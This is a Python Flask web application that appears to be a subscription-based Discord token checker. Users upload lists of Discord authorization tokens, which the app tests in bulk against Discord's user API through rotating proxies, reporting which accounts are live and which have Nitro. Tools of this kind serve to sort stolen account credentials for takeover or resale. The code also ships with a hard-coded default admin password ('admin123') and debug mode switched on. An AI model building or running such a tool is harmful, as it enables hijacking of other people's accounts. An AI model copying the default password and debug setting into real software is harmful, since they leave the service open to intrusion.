import os
import threading
import time
import requests
import secrets
from datetime import datetime, timedelta
from flask import Flask, render_template, request, jsonify, redirect, url_for, flash
from flask_socketio import SocketIO, emit
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
# Secret key for session security
app.config['SECRET_KEY'] = secrets.token_hex(24)

# Database Configuration
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'

socketio = SocketIO(app, async_mode='threading')

# Global state
processing = False
stop_signal = False

# --- Database Models ---
class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(150), unique=True, nullable=False)
    password = db.Column(db.String(150), nullable=False)
    is_admin = db.Column(db.Boolean, default=False)
    is_banned = db.Column(db.Boolean, default=False)
    access_key = db.Column(db.String(50), unique=True, nullable=True)
    expiry_date = db.Column(db.DateTime, nullable=True)

@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))

# --- Helper Functions ---
def check_token(token, proxy=None):
    """
    Checks a single token validity.
    Returns: (is_valid, token_info_dict)
    """
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Authorization": token.strip()
    }
    
    proxies = {}
    if proxy:
        proxies = {
            'http': f'http://{proxy}',
            'https': f'http://{proxy}'
        }

    try:
        # Check basic validity
        r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, proxies=proxies, timeout=10)
        if r.status_code == 200:
            data = r.json()
            return True, data
        else:
            return False, None
    except Exception as e:
        return False, None

def worker_check(tokens, use_proxies, proxy_list, delay):
    """
    Background worker to check tokens.
    """
    global processing, stop_signal
    total = len(tokens)
    checked = 0
    valid = 0
    invalid = 0
    nitro = 0

    socketio.emit('status_update', {'msg': f'Starting check for {total} tokens...'})

    for i, token in enumerate(tokens):
        if stop_signal:
            break
            
        proxy = None
        if use_proxies and proxy_list:
            proxy = proxy_list[i % len(proxy_list)]

        is_valid, info = check_token(token, proxy)
        
        if is_valid:
            valid += 1
            # Basic nitro check based on premium_type (1: Nitro Classic, 2: Nitro, 3: Basic)
            is_nitro = False
            if info.get('premium_type'):
                nitro += 1
                is_nitro = True
            
            socketio.emit('log_entry', {
                'type': 'success', 
                'msg': f'[VALID] {info["username"]}#{info["discriminator"]}',
                'data': info
            })
        else:
            invalid += 1
            socketio.emit('log_entry', {'type': 'error', 'msg': f'[INVALID] {token[:20]}...'})

        checked += 1
        socketio.emit('stats_update', {
            'checked': checked,
            'valid': valid,
            'invalid': invalid,
            'nitro': nitro,
            'total': total
        })

        if delay > 0:
            time.sleep(delay)

    processing = False
    socketio.emit('status_update', {'msg': 'Check complete!'})
    socketio.emit('process_complete', {})

# --- Routes ---

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        user = User.query.filter_by(username=username).first()
        
        if user:
            # Check Ban
            if user.is_banned:
                flash('Your account has been banned.', 'error')
                return render_template('login.html')
            
            # Check Expiry
            if user.expiry_date and user.expiry_date < datetime.now():
                flash('Your membership has expired. Contact admin.', 'error')
                return render_template('login.html')

            if check_password_hash(user.password, password):
                login_user(user)
                if user.is_admin:
                    return redirect(url_for('admin_panel'))
                return redirect(url_for('index'))
            else:
                flash('Invalid password', 'error')
        else:
            flash('User not found', 'error')
            
    return render_template('login.html')

@app.route('/login.html')
def login_html_redirect():
    return redirect(url_for('login'))

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))

@app.route('/')
@login_required
def index():
    if current_user.is_banned:
         logout_user()
         return redirect(url_for('login'))
    return render_template('index.html')

# --- Admin Routes ---
@app.route('/admin')
@login_required
def admin_panel():
    if not current_user.is_admin:
        return redirect(url_for('index'))
    users = User.query.all()
    return render_template('admin.html', users=users)

@app.route('/admin/add_user', methods=['POST'])
@login_required
def add_user():
    if not current_user.is_admin:
        return redirect(url_for('index'))
    
    username = request.form.get('username')
    duration = request.form.get('duration') # days
    
    if User.query.filter_by(username=username).first():
        flash('Username already exists', 'error')
        return redirect(url_for('admin_panel'))
    
    # Generate random key and password
    access_key = secrets.token_hex(8)
    password = access_key # Initial password is the key
    hashed_pw = generate_password_hash(password, method='pbkdf2:sha256')
    
    expiry = None
    if duration != 'lifetime':
        expiry = datetime.now() + timedelta(days=int(duration))
        
    new_user = User(
        username=username, 
        password=hashed_pw, 
        access_key=access_key,
        expiry_date=expiry
    )
    db.session.add(new_user)
    db.session.commit()
    
    flash(f'User created! Key/Pass: {access_key}', 'success')
    return redirect(url_for('admin_panel'))

@app.route('/admin/toggle_ban/<int:user_id>')
@login_required
def toggle_ban(user_id):
    if not current_user.is_admin: return redirect(url_for('index'))
    user = User.query.get(user_id)
    if user and user.username != 'admin':
        user.is_banned = not user.is_banned
        db.session.commit()
    return redirect(url_for('admin_panel'))

@app.route('/admin/delete_user/<int:user_id>')
@login_required
def delete_user(user_id):
    if not current_user.is_admin: return redirect(url_for('index'))
    user = User.query.get(user_id)
    if user and user.username != 'admin':
        db.session.delete(user)
        db.session.commit()
    return redirect(url_for('admin_panel'))

@app.route('/admin/update_admin', methods=['POST'])
@login_required
def update_admin():
    if not current_user.is_admin: return redirect(url_for('index'))
    new_pass = request.form.get('new_password')
    if new_pass:
        current_user.password = generate_password_hash(new_pass, method='pbkdf2:sha256')
        db.session.commit()
        flash('Admin password updated', 'success')
    return redirect(url_for('admin_panel'))

@app.route('/api/start_check', methods=['POST'])
@login_required
def start_check():
    global processing, stop_signal
    
    if processing:
        return jsonify({'status': 'error', 'message': 'A process is already running.'})

    data = request.json
    tokens = data.get('tokens', [])
    proxies = data.get('proxies', [])
    use_proxies = data.get('use_proxies', False)
    delay = float(data.get('delay', 0))

    if not tokens:
        return jsonify({'status': 'error', 'message': 'No tokens provided.'})

    processing = True
    stop_signal = False
    
    # Start background thread
    threading.Thread(target=worker_check, args=(tokens, use_proxies, proxies, delay)).start()

    return jsonify({'status': 'success', 'message': 'Started checking process.'})

@app.route('/api/stop', methods=['POST'])
@login_required
def stop_process():
    global stop_signal
    stop_signal = True
    return jsonify({'status': 'success', 'message': 'Stopping...'})

# --- Initialization ---
def create_admin():
    with app.app_context():
        # Re-create tables if schema changed (basic migration)
        # Note: In production use Flask-Migrate. Here we might need to delete db if struct changes drastically
        # or just let sqlalchemy handle it (it won't alter existing tables usually).
        # For simplicity in this env, we rely on users not having important data yet.
        db.create_all()
        
        # Check if admin exists
        admin = User.query.filter_by(username='admin').first()
        if not admin:
            hashed_pw = generate_password_hash('admin123', method='pbkdf2:sha256')
            new_user = User(username='admin', password=hashed_pw, is_admin=True)
            db.session.add(new_user)
            db.session.commit()
            print("Admin user created: admin / admin123")
        else:
            # Ensure admin has admin privs (in case of legacy db)
            if not admin.is_admin:
                admin.is_admin = True
                db.session.commit()

if __name__ == '__main__':
    create_admin()
    socketio.run(app, debug=True, port=5000)
